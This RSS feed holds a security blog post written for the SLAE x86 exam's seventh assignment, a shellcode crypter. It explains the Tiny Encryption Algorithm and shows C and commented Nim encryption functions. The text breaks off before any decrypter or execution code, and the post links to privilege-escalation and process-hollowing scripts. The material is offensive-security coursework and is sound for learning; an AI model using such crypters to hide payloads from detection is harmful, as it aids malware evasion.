<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>rbct</title>
    <description>Blog about cybersecurity and other</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 21 Jan 2022 07:47:34 +0100</pubDate>
    <lastBuildDate>Fri, 21 Jan 2022 07:47:34 +0100</lastBuildDate>
    <generator>Jekyll v4.2.0</generator>
    
      <item>
        <title>SLAE x86 Exam - Assignment #7</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 7th assignment requires you to create a custom crypter. You're free to use any existing encryption scheme.&lt;/p&gt;
&lt;p&gt;Moreover, you can use any programming language.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source Code&lt;/h2&gt;
&lt;p&gt;The files regarding this assignment are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/7/encrypter.nim&quot;&gt;encrypter.nim&lt;/a&gt;, the program that encrypts the shellcode&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/7/decrypter.nim&quot;&gt;decrypter.nim&lt;/a&gt;, the program that decrypts encrypter shellcode and runs it&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;tiny-encryption-alghorithm&quot;&gt;Tiny Encryption Alghorithm&lt;/h2&gt;
&lt;p&gt;Among the many encryption algorithm invented up until now, there's one named &lt;strong&gt;Tiny Encryption Algorithm&lt;/strong&gt; (&lt;code&gt;TEA&lt;/code&gt;), a block cipher whose implementation is quite simple.&lt;/p&gt;
&lt;p&gt;As you may read on &lt;a href=&quot;https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm&quot;&gt;Wikipedia&lt;/a&gt;,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;it was first presented at the Fast Software Encryption workshop in Leuven in &lt;code&gt;1994&lt;/code&gt;, and first published in the proceedings of that workshop.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;TEA&lt;/code&gt; operates on two &lt;code&gt;32-bit&lt;/code&gt; unsigned integers and uses a &lt;code&gt;128-bit&lt;/code&gt; key.&lt;/p&gt;
&lt;p&gt;Moreover:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It has a &lt;strong&gt;Feistel structure&lt;/strong&gt; with a suggested 64 rounds, typically implemented in pairs termed cycles.&lt;/p&gt;
&lt;p&gt;It has an extremely simple key schedule, mixing all of the key material in exactly the same way for each cycle.&lt;/p&gt;
&lt;p&gt;Different multiples of a magic constant are used to prevent simple attacks based on the symmetry of the rounds.&lt;/p&gt;
&lt;p&gt;The magic constant, &lt;code&gt;2654435769&lt;/code&gt; or &lt;code&gt;0x9E3779B9&lt;/code&gt; is chosen to be ⌊ &lt;code&gt;232 / ϕ&lt;/code&gt; ⌋, where &lt;code&gt;ϕ&lt;/code&gt; is the &lt;strong&gt;golden ratio&lt;/strong&gt; [...]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;nim-encrypter&quot;&gt;Nim Encrypter&lt;/h3&gt;
&lt;p&gt;On the &lt;code&gt;Wikipedia&lt;/code&gt; page I've mentioned previosly there's already a snippet of code containing the functions necessary to encrypt and decyrpt data using the algorithm.&lt;/p&gt;
&lt;p&gt;The functions are written in &lt;code&gt;C&lt;/code&gt;, so rewriting them in &lt;code&gt;C/C++&lt;/code&gt; is pretty much useless, as they are already there.&lt;/p&gt;
&lt;p&gt;For this reason, I've decided to use another language, which this time isn't &lt;code&gt;Python&lt;/code&gt;, but &lt;code&gt;Nim&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I've already used the latter for &lt;a href=&quot;https://github.com/rbctee/NimScripts/blob/master/windows/privesc/admin_to_system.nim&quot;&gt;Privilege Escalation&lt;/a&gt; and &lt;a href=&quot;https://github.com/rbctee/NimScripts/blob/master/windows/malware/process_hollowing.nim&quot;&gt;Process Hollowing&lt;/a&gt; on Windows systems, so I thought I might as well take advantage of this chance to &lt;strong&gt;actually&lt;/strong&gt; learn a bit of Nim.&lt;/p&gt;
&lt;h4 id=&quot;encryption&quot;&gt;Encryption&lt;/h4&gt;
&lt;p&gt;First comes the encryption. Converting the C code into Nim wasn't that difficult, as both of them are statically typed languages.&lt;/p&gt;
&lt;p&gt;First, here's the the encryption function I had to convert, taken directly from &lt;a href=&quot;https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm&quot;&gt;Wikipedia&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9E3779B9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, it is based on &lt;code&gt;XOR&lt;/code&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/Circular_shift&quot;&gt;Circular shifts&lt;/a&gt; and addition operations. All of them are repeated 32 times using a loop.&lt;/p&gt;
&lt;p&gt;Follows the &lt;code&gt;Nim&lt;/code&gt; code I wrote for this function, plus &lt;em&gt;some&lt;/em&gt; comments to document what I've learned along the way:&lt;/p&gt;
&lt;div class=&quot;language-nim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#    References for the Encryption function:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        - https://it.wikipedia.org/wiki/Tiny_Encryption_Algorithm&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        - https://link.springer.com/content/pdf/10.1007/3-540-60590-8_29.pdf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#    As per the reference, the function accepts the following arguments:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        - 'v': an array made up of 2 unsigned 32-bit integers (hence uint32)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#            it contains 8 bytes of data to encrypt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        - 'k': an array made up of 4 uint32 integers, hence a 128-bits key&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#            it's the encryption key&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#    As for how to encode data and key to uint32 integers, it's up to you&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#    In fact, in the original whitepaper I didn't find anything about&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        this matter&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;proc &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Variables used by the encryption function.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Follows the difference between the 'let' and 'var' statements:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        - 'let': After the initialization their value cannot change&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        - 'var': After the initialization their value CAN be changed&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Moreover, by default the value of an integer is 0, so it doesn't need&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    to be inizialed to 0&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    According to the whitepaper:&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; A different multiple of delta is used in each round so that no&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; bit of the multiple will not change frequently. We suspect the&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; algorithm is not very sensitive to the value of delta and we&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; merely need to avoid a bad value.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; It will be noted that delta turns out to be odd with truncation&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt;  or nearest rounding, so no extra precautions are needed to&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; ensure that all the digits of sum change.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9e3779b9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;


    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    The algorithm uses 32 cycles (64 rounds) to encrypt data &lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shr&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shr&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Data is returned as an array of 2 uint32 integers, which represent 8&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        bytes of encrypted data&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
